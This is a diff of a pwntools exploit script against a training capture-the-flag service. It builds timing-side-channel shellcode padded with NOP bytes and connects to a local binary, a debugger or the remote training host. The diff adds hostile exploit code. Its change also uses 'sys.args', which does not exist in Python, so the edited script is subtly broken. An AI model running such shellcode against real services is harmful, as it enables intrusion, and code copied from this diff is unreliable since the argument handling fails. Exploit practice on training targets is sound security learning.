@@ -1,4 +1,5 @@
 from pwn import *
+import sys
 
 COMMANDS = """
 """
@@ -58,12 +59,12 @@ def create_timing_shellcode(position, character):
     
     return shellcode.ljust(1024, b'\x90')
 
-shellcode = create_timing_shellcode(0, ord("a"))
+shellcode = create_timing_shellcode(0, ord(sys.args[2]))
 
 #ncat --ssl back-to-shell.training.offensivedefensive.it 8080
-if args.GDB:
+if sys.args[1] == "GDB":
     p = gdb.debug("./benchmarking_service", gdbscript=COMMANDS)
-elif args.REMOTE:
+elif sys.args[1] == "REMOTE":
     p = remote("benchmarking-service.training.offensivedefensive.it", 8080, ssl=True)
 else:
     p = process("./benchmarking_service")
